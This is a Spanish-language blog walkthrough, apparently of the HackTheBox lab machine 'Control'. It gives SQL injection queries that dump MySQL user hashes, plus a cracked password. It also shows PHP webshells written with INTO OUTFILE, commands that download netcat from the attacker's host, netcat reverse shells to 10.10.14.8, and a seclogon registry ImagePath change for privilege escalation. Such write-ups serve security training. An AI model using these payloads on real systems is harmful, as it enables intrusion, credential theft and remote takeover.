---
layout: single
title: Máquina Control - HackTheBox (OSCP Style)
excerpt: "Regresé, de nuevo con writeups de máquinas en HackTheBox. En esta ocasión, estaremos resolviendo la máquina Control, la cual figura en la plataforma con un nivel de dificultad Hard."
date: 2021-09-8
classes: wide
header:
  teaser: /assets/images/control-htb/portada.png
  teaser_home_page: true
categories:
  - HTB
  - Blog
tags:
  - Blog
  - Writeup
  - Guía
  - Walkthrough
---

+ **Información de la máquina**
	
	![0]

+ Iniciamos, como siempre, verificando que tengamos comunicación a la máquina por medio de una traza ICMP. Por el TTL deducimos que es una máquina Windows.

	![1]
	
+ Iniciamos la fase de reconocimiento con un escaneo rápido con ayuda de nmap en busca de puertos TCP abiertos.

	![2]
	
	Gracias a esto, podemos observar un servicio HTTP corriendo y un par de puertos más: uno identificado como mysql y otros de RPC.
	
+ Corremos un segundo escaneo en busca de versiones y servicios específicos para dichos puertos.

	![3]
	
	Dicho escaneo no parece revelar nada nuevo respecto a los servicios. Por lo tanto, de momento nos enfocaremos en el servicio HTTP.
	
+ Empleando **whatweb** podemos ver algunos detalles técnicos de la web, pero como la información que nos regresa no es de utilidad, procedemos a realizar un fuzzing en busca de directorios.

	![4]
	
+ El **fuzzing** lo llevamos a cabo con **wfuzz**, empleando el diccionario directory-list-2-3-medium.
	
	``wfuzz -c --hc=404 -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2-3-medium.txt http://10.10.10.167/FUZZ/``

	![5]
	
	Vemos un par de directorios interesantes, los cuales veremos más adelante.
	
+ Ingresamos a la web por medio de un navegador, y vemos lo siguiente.

	![6]
	
	Al parecer, se trata de un sitio de venta de antenas WiFi, la cual lleva toda una administración por detrás (lo que me indica que hay una base de datos en algún lugar).
	
+ Si intentamos acceder al panel de logueo de la esquina superior derecha, vemos que nos redirige al sitio **admin.php**, el cual nos indica que, para acceder a este sitio, requerimos estar detrás de un proxy específico por un parámetro faltante en la cabecera de la consulta. Un parámetro que viaja en la cabecera de la petición, y que ayuda al sitio web a identificar de qué dirección IP procede la petición es la cabecera **X-Forwarded-For**, la cual solo lleva una dirección IP. Este parámetro se puede emplear en otros escenarios, como la suplantación del origen de una petición al tener un número limitado de intentos en un panel de logueo, pero en este caso, solo requiere el proxy indicado para poder acceder a este panel de administración.

	![7]
	
+ Si analiamos el código fuente del sitio web, veremos que en la página principal hay unas anotaciones hechas por el desarrollador, a modo de lista de pendientes, en la que habla sobre la habilitación del SSL en lo que parece ser un recurso compartido por red SMB. Sin embargo, lo que resalta de esta instrucción, es la dirección IP que muestra como la fuente de dicho recurso. Intentemos ingresar esta dirección como el parámetro de **X-Forwarded-For** para ver si podemos acceder.

	![8]
	
+ Si interceptamos la petición a este panel de administración con Burpsuite, agregamos la cabecera faltante y dejamos a la petición continuar, del lado del navegador veremos que ahora sí podemos observar el contenido de esta página.

	![9]

	![10]
	
	Dentro de este sitio web, llama la atención un campo donde podemos buscar productos. Como de costumbre, probamos una inyección SQL dentro de este para ver si es vulnerable.

+ Al momento de ingresar la consulta **' order by 10-- -** vemos que el sitio nos responde con lo siguiente:

	``Column not found: 1054 Unknown column '10' in 'order clause'``
	
	Esto nos indica que es vulnerable a inyección SQL y entonces procedemos a enumerar las bases de datos. Como cada petición debe viajar con la cabecera del proxy, realizamos todo este proceso desde el repeater de Burpsuite.
	
	![11]
	
+ Estando desde Burpsuite, vemos que una simple consulta por el nombre de la base de datos es respondida. La database se llama **warehouse**. Sin embargo, esta contiene elementos de la misma web consernientes al inventario de los productos que venden. Es poco probable que haya usuarios dentro, por lo que buscamos por otras bases de datos.

	![12]

+ Buscamos el nombre de todas las bases de datos por medio de la siguiente query:
	
	``' union select 1,2,3,4,group_concat(schema_name),6 from information_schema.schemata-- -``
	
	![13]
	
+ Vemos una base de datos **mysql**, la cual también aparecía en el escaneo inicial de nmap. Lo más probable es que haya usuarios dentro, por lo que procedemos a enumerar sus tablas y columnas.

	Enumeración de tablas:
	
	``' union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema='mysql'-- -``
	
	![14]
	
	Vemos que la última tabla que nos devuelve la consulta es **user**, por lo que ahora enumeramos las columnas de dicha tabla:
	
	``' union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_schema='mysql' and table_name='user'-- -``
	
	![15]
	
	Esta devuelve varias columnas, pero destacan dos: **User** y **Password**, enumeramos todos los usuarios junto con sus contraseñas que estén en esta tabla 'user':
	
	``' union select 1,2,3,4,group_concat(User,0x3a,Password),6 from mysql.user-- -``
	
	![16]
	
	La consulta nos devuelve tres usuarios, entre ellos uno llamado **Hector**. Si pasamos sus hashes por John con el objetivo de crackearlos, solo podrá descifrar la contraseña de Hector, la cual es:
	
	``l33th4x0rhector``
	
	Sin embargo, no hay por el momento algún servicio o panel en el cual podramos probar si la credencial es válida. Para este punto, teniendo SQLi y poco que hacer con la información dumpeada de la base de datos, queda probar a subir archivos al sistema por medio del parámetro **into outfile** de SQL. El objetivo de esto es subir una reverse shell en el sistema, un archivo malicioso que nos ejecute algún comando cuando accedamos a este recurso.
	
+ De acuerdo con el fuzzing realizado a la web, hay una carpeta de **uploads**, a la cual no podemos acceder directamente desde la web, pero tal vez podamos acceder a sus recursos, claro, conociendo el nombre exacto de estos. Para esto, recordemos que estamos en un sistema Windows, por lo que el servicio web es un IIS. La ruta por defecto donde se almacenan los archivos de este servidor es:

	``C:\inetpub\wwwroot``
	
	Así que intentamos subir un archivo de prueba a dicha ruta, agregando al final la carpeta **uploads**
	
	``' union select 1,2,3,4,"prueba",6 into outfile "C:\\inetpub\\wwwroot\\uploads\\prueba.php"-- -``
	
	![17]
	
	Vemos que la respuesta del servidor es un error SQL, pero si nos dirigimos a la web, al directorio de uploads, y colocamos el nombre del archivo, veremos que podemos acceder al recurso. El siguiente paso será subir un php malicioso que ejecute una acción por medio del parámetro **system**, primero para subir un netcat al sistema, y segundo para ejecutarlo y que nos entable una reverse shell.
	
	![18]
	
+ Primero se intentó subir un php con el siguiente código:

	```
	<?php
		system('\\10.10.14.8\smbFolder\nc.exe -e cmd 10.10.14.8 443');
	?>
	```
	
	El objetivo era tomar el netcat de un servicio SMB que nosotros mismos ponemos disponible desde nuestra máquina, y así solo entablarnos la reverse shell. Sin embargo, esto no funcionó, por lo que se decidió entonces primero copiar el netcat en el sistema, y luego ejecutarlo.
	
	![19]
	
+ Para subir el archivo a la carpeta **uploads** nos valemos de la utilidad **Invoke-WebRequest** de powershell mediante la siguiente consulta:

	``' union select 1,2,3,4,"<?php system('powershell iwr -Uri http://10.10.14.8/nc.exe -OutFile C:\\inetpub\\wwwroot\\uploads\\nc.exe'); ?>",6 into outfile "C:\\inetpub\\wwwroot\\uploads\\shell.php"-- -``
	
	![20]
	
	Una vez visitamos la página de este php creado, y teniendo un netcat.exe en una carpeta compartida por medio de un servidor HTTP con ayuda de Python, veremos en esta consola una petición GET de dicho recurso, por lo que debemos confiar en este punto de que el archivo se subió a la máquina y se guardó. Digo confiar porque siempre puede suceder que el sistema tome el archivo pero no lo quiera guardar si está activo el Defender.
	
+ Lo siguiente es subir un nuevo archivo php, pero este ahora ejecutará el netcat para entablarnos una reverse shell.

	``' union select 1,2,3,4,"<?php system('C:\\inetpub\\wwwroot\\uploads\\nc.exe -e cmd 10.10.14.8 443'); ?>",6 into outfile "C:\\inetpub\\wwwroot\\uploads\\shell2.php"-- -``
	
	![21]
	
	Si en otra consola nos ponemos en escucha con netcat en el puerto especificado, y visitamos el recurso php que acabamos de crear, veremos que se nos entabla una comunicación y tenemos acceso al sistema.
	
	![22]
	
+ Ya dentro del sistema, vemos que no podemos acceder a los archivos de ningún usuario. Vemos uno en particular, llamado **Hector**. Recormdemos que logramos obtener sus credenciales del dumpeo de la base de datos, sin embargo, no tenemos un servicio como SMB o WINRM para corroborar estar credenciales. Lo que tenemos que hacer es un PSCredential, por medio del cual ejecutaremos comandos como si fuéramos **Hector** dentro de la máquina. El objetivo sería, con estas credenciales, volver a usar el netcat para entablarnos una reverse shell ahora como este usuario.

	![23]
	
	Para esto, primero debemos hacer un tratamiento de estas credenciales que hemos obtenido. Todo este proceso debe hacerse desde una terminal de powershell. Como con e netcat obtuvimos una cmd, solo basta con escribir **powershell** para acceder a esta terminal:
	
	```
	$user = 'Fidelity\Hector'  //Este comando contempla HOST\USUARIO, donde el host puede encontrarse con el comando hostname
	$password = 'l33th4x0rhector'
	$secpw = ConvertTo-SecureString $password -AsPlainText -Force
	
	$cred = New-Object System.Management.Automation.PSCredential $user,$secpw
	```
	
	Ahora con estas nuevas credenciales, solo debemos ejecutar un comando. Intentaremos un **whoami** para corroborar que todo funcione correctamente:
	
	```
	Invoke-Command -ComputerName localhost -Cred $cred -ScriptBlock {whoami}
	control\hector
	```
	
	Viendo que podemos ejecutar comandos como el usuario **Hector**, procedemos a usar el netcat que ya hemos subido al sistema para, de nueva cuenta, entablarnos otra reverse shell ahora como este usuario:
	
	``Invoke-Command -ComputerName localhost -Cred $cred -ScriptBlock {C:\\inetpub\\wwwroot\\uploads\\nc.exe -e cmd 10.10.14.8 443}``
	
	![24]
	
	![25]
	
+ Ya como el usuario Hector, podemos visualizar la flag de usuario:
	
	![26]
	
	Vemos que este usuario no cuenta con muchos privilegios dentro del sistema, lo que limita los vectores de ataque a probar para escalar privilegios. Ejecutamos un WinPeas en el sistema para enumerar en busca de posibles vectores de ataque. Para ello, nos valemos de nueva cuenta de powershell y el Invoke-WebRequest para subir el binario al sistema y poder ejecutarlo:
	
	``iwr -Uri http://10.10.14.8/winpeas.exe -OutFile C:\Users\Hector\Desktop\winpeas.exe``
	
	Empleamos la carpeta Desktop ya que el usuario tiene permisos de escritura aquí. Ejecutamos el WinPeas.
	
	![27]
	
+ Salta a la vista una serie de registros marcados con rojo, color que WinPeas usa para indicar algo que puede ser aprovechado como vulnerabilidad. Son la mayoría de registros del sistema, por no decir que todos. Uno es importante, ya que permite escalar privilegios de manera sencilla: **seclogon**.

	![28]
	
	Para aprovecharse de este registro, primero debemos ver si este se encuentra corriendo, y si lo está, entonces detenerlo.
	
	``sc query seclogon``
	
	![29]
	
	Como podemos observar, el servicio está detenido, por lo que podemos proceder. Si vemos las características de este servicio, veremos un campo llamado ImagePath. El objetivo de nuestro vector, es que, al arrancar el servicio, ejecute alguna acción, y ImagePath sirve para colocar un comando (como por ejemplo, una reverse shell ayudándode se netcat).

	``reg query HKLM\system\currentcontrolset\services\seclogon``
	
	![30]
	
	Modificamos el parámetro ImagePath del registro de la siguiente manera:
	
	``reg add HKLM\system\currentcontrolset\services\seclogon \t REG_EXPAND_sZ \v ImagePath \d "C:\inetpub\wwwroot\uploads\nc.exe -e cmd 10.10.14.8 443" \f``
	
	![31]
	
	Como podemos observar, hemos metido una reverse shell en el ImagePath, y ahora, si arrancamos el servicio, ese comando será ejecutado al iniciar.
	
	``sc start seclogon``
	
	Si al iniciar el servicio, estamos en otra consola en escucha con netcat, recibiremos la shell como el usuario administrador.
	
	![32]
	
	Finalmente, podremos visualizar la flag de root.
	
	![33]
    
[0]:/assets/images/control-htb/0.png
[1]:/assets/images/control-htb/1.png
[2]:/assets/images/control-htb/2.png
[3]:/assets/images/control-htb/3.png
[4]:/assets/images/control-htb/4.png
[5]:/assets/images/control-htb/5.png
[6]:/assets/images/control-htb/6.png
[7]:/assets/images/control-htb/7.png
[8]:/assets/images/control-htb/8.png
[9]:/assets/images/control-htb/9.png
[10]:/assets/images/control-htb/10.png
[11]:/assets/images/control-htb/11.png
[12]:/assets/images/control-htb/12.jpg
[13]:/assets/images/control-htb/13.png
[14]:/assets/images/control-htb/14.png
[15]:/assets/images/control-htb/15.png
[16]:/assets/images/control-htb/16.png
[17]:/assets/images/control-htb/17.png
[18]:/assets/images/control-htb/18.png
[19]:/assets/images/control-htb/19.png
[20]:/assets/images/control-htb/20.png
[21]:/assets/images/control-htb/21.png
[22]:/assets/images/control-htb/22.png
[23]:/assets/images/control-htb/23.png
[24]:/assets/images/control-htb/24.png
[25]:/assets/images/control-htb/25.png
[26]:/assets/images/control-htb/26.jpg
[27]:/assets/images/control-htb/27.png
[28]:/assets/images/control-htb/28.jpg
[29]:/assets/images/control-htb/29.png
[30]:/assets/images/control-htb/30.png
[31]:/assets/images/control-htb/31.png
[32]:/assets/images/control-htb/32.png
[33]:/assets/images/control-htb/33.jpg